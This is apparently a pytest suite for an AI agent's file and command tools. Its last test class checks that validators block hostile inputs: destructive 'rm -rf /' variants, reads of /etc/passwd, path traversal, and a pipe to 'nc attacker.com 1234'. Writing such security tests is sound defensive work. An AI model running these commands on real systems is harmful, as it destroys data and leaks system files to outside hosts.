"""End-to-end tests for AI agent tools functionality.

Tests verify that all tools (file operations, command execution) work correctly
in realistic scenarios including single operations, multiple operations,
and edge cases.
"""

import tempfile
from pathlib import Path
from typing import Any

import pytest

from gearmeshing_ai.agent.abstraction.tools.definitions import (
    CommandRunInput,
    FileListInput,
    FileReadInput,
    FileWriteInput,
)
from gearmeshing_ai.agent.abstraction.tools.handlers import (
    list_files_handler,
    read_file_handler,
    run_command_handler,
    write_file_handler,
)
from gearmeshing_ai.agent.abstraction.tools.security import (
    validate_command,
    validate_file_path,
)


@pytest.fixture
def temp_dir() -> Any:
    """Create a temporary directory for testing."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield tmpdir


class TestFileReadingE2E:
    """End-to-end tests for file reading operations."""

    @pytest.fixture
    def sample_files(self, temp_dir: str) -> dict[str, str]:
        """Create sample files for testing."""
        files = {
            "file1.txt": "Content of file 1\nLine 2\nLine 3",
            "file2.txt": "Content of file 2\nMultiple lines here",
            "nested/file3.txt": "Nested file content",
            "nested/subdir/file4.txt": "Deeply nested file",
        }

        for file_path, content in files.items():
            full_path = Path(temp_dir) / file_path
            full_path.parent.mkdir(parents=True, exist_ok=True)
            full_path.write_text(content)

        return {k: str(Path(temp_dir) / k) for k in files}

    @pytest.mark.asyncio
    async def test_read_single_file(self, sample_files: dict[str, str]) -> None:
        """Test reading a single file."""
        file_path = sample_files["file1.txt"]

        # Validate path
        validation = validate_file_path(file_path, "read")
        assert validation.valid is True

        # Read file
        input_data = FileReadInput(file_path=file_path)
        result = await read_file_handler(input_data)

        assert result.success is True
        assert "Content of file 1" in result.content

    @pytest.mark.asyncio
    async def test_read_multiple_files_sequential(self, sample_files: dict[str, str]) -> None:
        """Test reading multiple files sequentially."""
        file_paths = [sample_files["file1.txt"], sample_files["file2.txt"]]
        results = []

        for file_path in file_paths:
            validation = validate_file_path(file_path, "read")
            assert validation.valid is True
            input_data = FileReadInput(file_path=file_path)
            result = await read_file_handler(input_data)
            results.append(result)

        assert len(results) == 2
        assert results[0].success is True
        assert results[1].success is True
        assert "Content of file 1" in results[0].content
        assert "Content of file 2" in results[1].content

    @pytest.mark.asyncio
    async def test_read_nested_file(self, sample_files: dict[str, str]) -> None:
        """Test reading a file from nested directory."""
        file_path = sample_files["nested/file3.txt"]

        validation = validate_file_path(file_path, "read")
        assert validation.valid is True

        input_data = FileReadInput(file_path=file_path)
        result = await read_file_handler(input_data)

        assert result.success is True
        assert "Nested file content" in result.content

    @pytest.mark.asyncio
    async def test_read_deeply_nested_file(self, sample_files: dict[str, str]) -> None:
        """Test reading a file from deeply nested directory."""
        file_path = sample_files["nested/subdir/file4.txt"]

        validation = validate_file_path(file_path, "read")
        assert validation.valid is True

        input_data = FileReadInput(file_path=file_path)
        result = await read_file_handler(input_data)

        assert result.success is True
        assert "Deeply nested file" in result.content

    @pytest.mark.asyncio
    async def test_read_file_with_different_encoding(self, temp_dir: str) -> None:
        """Test reading a file with different encoding."""
        file_path = Path(temp_dir) / "utf8_file.txt"
        content = "Hello 世界 🌍"
        file_path.write_text(content, encoding="utf-8")

        validation = validate_file_path(str(file_path), "read")
        assert validation.valid is True

        input_data = FileReadInput(file_path=str(file_path), encoding="utf-8")
        result = await read_file_handler(input_data)

        assert result.success is True
        assert "世界" in result.content
        assert "🌍" in result.content

    @pytest.mark.asyncio
    async def test_read_nonexistent_file(self, temp_dir: str) -> None:
        """Test reading a nonexistent file returns error."""
        file_path = str(Path(temp_dir) / "nonexistent.txt")

        validation = validate_file_path(file_path, "read")
        assert validation.valid is True

        input_data = FileReadInput(file_path=file_path)
        result = await read_file_handler(input_data)

        assert result.success is False
        assert "not found" in result.error_message.lower()


class TestFileWritingE2E:
    """End-to-end tests for file writing operations."""

    @pytest.mark.asyncio
    async def test_write_single_file(self, temp_dir: str) -> None:
        """Test writing a single file."""
        file_path = str(Path(temp_dir) / "output.txt")
        content = "This is test content"

        validation = validate_file_path(file_path, "write")
        assert validation.valid is True

        input_data = FileWriteInput(file_path=file_path, content=content)
        result = await write_file_handler(input_data)

        assert result.success is True
        assert Path(file_path).exists()
        assert Path(file_path).read_text() == content

    @pytest.mark.asyncio
    async def test_write_multiple_files_sequential(self, temp_dir: str) -> None:
        """Test writing multiple files sequentially."""
        files_to_write = {
            "file1.txt": "Content 1",
            "file2.txt": "Content 2",
            "file3.txt": "Content 3",
        }

        for filename, content in files_to_write.items():
            file_path = str(Path(temp_dir) / filename)
            validation = validate_file_path(file_path, "write")
            assert validation.valid is True

            input_data = FileWriteInput(file_path=file_path, content=content)
            result = await write_file_handler(input_data)

            assert result.success is True
            assert Path(file_path).read_text() == content

    @pytest.mark.asyncio
    async def test_write_to_nested_directory(self, temp_dir: str) -> None:
        """Test writing a file to nested directory (creates if needed)."""
        file_path = str(Path(temp_dir) / "nested" / "subdir" / "file.txt")
        content = "Nested content"

        validation = validate_file_path(file_path, "write")
        assert validation.valid is True

        input_data = FileWriteInput(file_path=file_path, content=content, create_dirs=True)
        result = await write_file_handler(input_data)

        assert result.success is True
        assert Path(file_path).exists()
        assert Path(file_path).read_text() == content

    @pytest.mark.asyncio
    async def test_write_with_different_encoding(self, temp_dir: str) -> None:
        """Test writing a file with different encoding."""
        file_path = str(Path(temp_dir) / "utf8_file.txt")
        content = "Hello 世界 🌍"

        validation = validate_file_path(file_path, "write")
        assert validation.valid is True

        input_data = FileWriteInput(file_path=file_path, content=content, encoding="utf-8")
        result = await write_file_handler(input_data)

        assert result.success is True
        assert Path(file_path).read_text(encoding="utf-8") == content

    @pytest.mark.asyncio
    async def test_overwrite_existing_file(self, temp_dir: str) -> None:
        """Test overwriting an existing file."""
        file_path = str(Path(temp_dir) / "file.txt")

        # Write initial content
        Path(file_path).write_text("Initial content")

        # Overwrite with new content
        new_content = "New content"
        validation = validate_file_path(file_path, "write")
        assert validation.valid is True

        input_data = FileWriteInput(file_path=file_path, content=new_content)
        result = await write_file_handler(input_data)

        assert result.success is True
        assert Path(file_path).read_text() == new_content

    @pytest.mark.asyncio
    async def test_write_empty_file(self, temp_dir: str) -> None:
        """Test writing an empty file."""
        file_path = str(Path(temp_dir) / "empty.txt")

        validation = validate_file_path(file_path, "write")
        assert validation.valid is True

        input_data = FileWriteInput(file_path=file_path, content="")
        result = await write_file_handler(input_data)

        assert result.success is True
        assert Path(file_path).exists()
        assert Path(file_path).read_text() == ""

    @pytest.mark.asyncio
    async def test_write_large_file(self, temp_dir: str) -> None:
        """Test writing a large file."""
        file_path = str(Path(temp_dir) / "large.txt")
        # Create 1MB of content
        content = "x" * (1024 * 1024)

        validation = validate_file_path(file_path, "write")
        assert validation.valid is True

        input_data = FileWriteInput(file_path=file_path, content=content)
        result = await write_file_handler(input_data)

        assert result.success is True
        assert Path(file_path).stat().st_size == len(content)


class TestFileListingE2E:
    """End-to-end tests for file listing operations."""

    @pytest.fixture
    def temp_dir_with_files(self, temp_dir: str) -> str:
        """Create a temporary directory with various files."""
        # Create directory structure
        Path(temp_dir).joinpath("subdir1").mkdir()
        Path(temp_dir).joinpath("subdir2").mkdir()
        Path(temp_dir).joinpath("subdir1/nested").mkdir()

        # Create files
        Path(temp_dir).joinpath("file1.txt").write_text("content1")
        Path(temp_dir).joinpath("file2.py").write_text("print('hello')")
        Path(temp_dir).joinpath("subdir1/file3.txt").write_text("content3")
        Path(temp_dir).joinpath("subdir1/nested/file4.txt").write_text("content4")
        Path(temp_dir).joinpath("subdir2/file5.md").write_text("# Markdown")

        return temp_dir

    @pytest.mark.asyncio
    async def test_list_directory_contents(self, temp_dir_with_files: str) -> None:
        """Test listing contents of a directory."""
        validation = validate_file_path(temp_dir_with_files, "list")
        assert validation.valid is True

        input_data = FileListInput(directory_path=temp_dir_with_files)
        result = await list_files_handler(input_data)

        assert result.success is True
        files_str = " ".join(result.files)
        assert "file1.txt" in files_str
        assert "file2.py" in files_str
        assert "subdir1" in files_str
        assert "subdir2" in files_str

    @pytest.mark.asyncio
    async def test_list_directory_with_pattern(self, temp_dir_with_files: str) -> None:
        """Test listing files matching a pattern."""
        validation = validate_file_path(temp_dir_with_files, "list")
        assert validation.valid is True

        input_data = FileListInput(directory_path=temp_dir_with_files, pattern="*.txt")
        result = await list_files_handler(input_data)

        assert result.success is True
        files_str = " ".join(result.files)
        assert "file1.txt" in files_str
        assert "file2.py" not in files_str

    @pytest.mark.asyncio
    async def test_list_directory_recursive(self, temp_dir_with_files: str) -> None:
        """Test listing files recursively."""
        validation = validate_file_path(temp_dir_with_files, "list")
        assert validation.valid is True

        input_data = FileListInput(directory_path=temp_dir_with_files, recursive=True)
        result = await list_files_handler(input_data)

        assert result.success is True
        files_str = " ".join(result.files)
        assert "file1.txt" in files_str
        assert "file3.txt" in files_str
        assert "file4.txt" in files_str
        assert "file5.md" in files_str

    @pytest.mark.asyncio
    async def test_list_nested_directory(self, temp_dir_with_files: str) -> None:
        """Test listing contents of a nested directory."""
        nested_dir = str(Path(temp_dir_with_files) / "subdir1")
        validation = validate_file_path(nested_dir, "list")
        assert validation.valid is True

        input_data = FileListInput(directory_path=nested_dir)
        result = await list_files_handler(input_data)

        assert result.success is True
        files_str = " ".join(result.files)
        assert "file3.txt" in files_str
        assert "nested" in files_str

    @pytest.mark.asyncio
    async def test_list_empty_directory(self, temp_dir: str) -> None:
        """Test listing an empty directory."""
        empty_dir = str(Path(temp_dir) / "empty")
        Path(empty_dir).mkdir()

        validation = validate_file_path(empty_dir, "list")
        assert validation.valid is True

        input_data = FileListInput(directory_path=empty_dir)
        result = await list_files_handler(input_data)

        assert result.success is True


class TestCommandExecutionE2E:
    """End-to-end tests for command execution operations."""

    @pytest.mark.asyncio
    async def test_run_simple_echo_command(self) -> None:
        """Test running a simple echo command."""
        validation = validate_command("echo hello")
        assert validation.valid is True

        input_data = CommandRunInput(command="echo hello")
        result = await run_command_handler(input_data)

        assert result.success is True
        assert "hello" in result.stdout.lower()

    @pytest.mark.asyncio
    async def test_run_pwd_command(self) -> None:
        """Test running pwd command."""
        validation = validate_command("pwd")
        assert validation.valid is True

        input_data = CommandRunInput(command="pwd")
        result = await run_command_handler(input_data)

        assert result.success is True
        assert len(result.stdout) > 0

    @pytest.mark.asyncio
    async def test_run_command_with_timeout(self) -> None:
        """Test running command with timeout."""
        validation = validate_command("sleep 1")
        assert validation.valid is True

        input_data = CommandRunInput(command="sleep 1", timeout=5)
        result = await run_command_handler(input_data)

        # Should complete successfully
        assert result.success is True

    @pytest.mark.asyncio
    async def test_run_command_timeout_exceeded(self) -> None:
        """Test command timeout when exceeded."""
        validation = validate_command("sleep 10")
        assert validation.valid is True

        input_data = CommandRunInput(command="sleep 10", timeout=1)
        result = await run_command_handler(input_data)

        # Should timeout
        assert result.success is False

    @pytest.mark.asyncio
    async def test_run_command_with_working_directory(self, temp_dir: str) -> None:
        """Test running command in specific working directory."""
        # Create a test file in temp directory
        test_file = Path(temp_dir) / "test.txt"
        test_file.write_text("test content")

        validation = validate_command("ls")
        assert validation.valid is True

        input_data = CommandRunInput(command="ls", cwd=temp_dir)
        result = await run_command_handler(input_data)

        assert result.success is True
        assert "test.txt" in result.stdout


class TestMixedOperationsE2E:
    """End-to-end tests for mixed file and command operations."""

    @pytest.mark.asyncio
    async def test_write_then_read_file(self, temp_dir: str) -> None:
        """Test writing a file then reading it back."""
        file_path = str(Path(temp_dir) / "test.txt")
        original_content = "Test content for write-read cycle"

        # Write file
        write_input = FileWriteInput(file_path=file_path, content=original_content)
        write_result = await write_file_handler(write_input)
        assert write_result.success is True

        # Read file back
        read_input = FileReadInput(file_path=file_path)
        read_result = await read_file_handler(read_input)
        assert read_result.success is True
        assert read_result.content == original_content

    @pytest.mark.asyncio
    async def test_write_multiple_then_list_files(self, temp_dir: str) -> None:
        """Test writing multiple files then listing them."""
        files = {
            "file1.txt": "Content 1",
            "file2.txt": "Content 2",
            "file3.txt": "Content 3",
        }

        # Write files
        for filename, content in files.items():
            file_path = str(Path(temp_dir) / filename)
            write_input = FileWriteInput(file_path=file_path, content=content)
            await write_file_handler(write_input)

        # List files
        list_input = FileListInput(directory_path=temp_dir)
        list_result = await list_files_handler(list_input)

        assert list_result.success is True
        files_str = " ".join(list_result.files)
        for filename in files:
            assert filename in files_str

    @pytest.mark.asyncio
    async def test_create_directory_structure_with_files(self, temp_dir: str) -> None:
        """Test creating a directory structure with multiple files."""
        structure = {
            "docs/readme.md": "# Project README",
            "docs/guide.md": "# User Guide",
            "src/main.py": "print('hello')",
            "src/utils.py": "def helper(): pass",
            "tests/test_main.py": "def test_main(): pass",
        }

        # Create all files
        for file_path, content in structure.items():
            full_path = str(Path(temp_dir) / file_path)
            write_input = FileWriteInput(file_path=full_path, content=content, create_dirs=True)
            result = await write_file_handler(write_input)
            assert result.success is True

        # Verify structure with recursive listing
        list_input = FileListInput(directory_path=temp_dir, recursive=True)
        list_result = await list_files_handler(list_input)

        assert list_result.success is True
        files_str = " ".join(list_result.files)
        for file_path in structure:
            assert file_path.split("/")[-1] in files_str

    @pytest.mark.asyncio
    async def test_read_write_with_special_characters(self, temp_dir: str) -> None:
        """Test reading and writing files with special characters."""
        file_path = str(Path(temp_dir) / "special.txt")
        content = "Special chars: !@#$%^&*()_+-=[]{}|;:',.<>?/~`"

        # Write file with special characters
        write_input = FileWriteInput(file_path=file_path, content=content)
        write_result = await write_file_handler(write_input)
        assert write_result.success is True

        # Read file back
        read_input = FileReadInput(file_path=file_path)
        read_result = await read_file_handler(read_input)

        assert read_result.success is True
        assert read_result.content == content


class TestSecurityValidationE2E:
    """End-to-end tests for security validation in tool operations."""

    def test_path_traversal_prevention(self) -> None:
        """Test that path traversal attacks are prevented."""
        # Try to traverse outside the allowed directory
        dangerous_path = "../../etc/passwd"

        # Should be blocked by validation
        validation = validate_file_path(dangerous_path, "read")
        assert validation.valid is False
        assert "traversal" in validation.error.lower()

    def test_command_injection_prevention(self) -> None:
        """Test that command injection is prevented."""
        # Try to inject a command
        dangerous_command = "echo test; rm -rf /"

        # Should be blocked by validation
        validation = validate_command(dangerous_command)
        assert validation.valid is False

    def test_dangerous_command_prevention(self) -> None:
        """Test that dangerous commands are prevented."""
        dangerous_commands = [
            "rm -rf /",
            "del /f /s /q C:\\",
            "chmod 777 /etc/passwd",
            "sudo rm -rf /",
        ]

        for cmd in dangerous_commands:
            validation = validate_command(cmd)
            assert validation.valid is False

    def test_shell_injection_prevention(self) -> None:
        """Test that shell injection patterns are prevented."""
        injection_patterns = [
            "echo test && rm -rf /",
            "echo test || cat /etc/passwd",
            "echo test | nc attacker.com 1234",
            "echo test `whoami`",
            "echo test $(whoami)",
        ]

        for cmd in injection_patterns:
            validation = validate_command(cmd)
            assert validation.valid is False
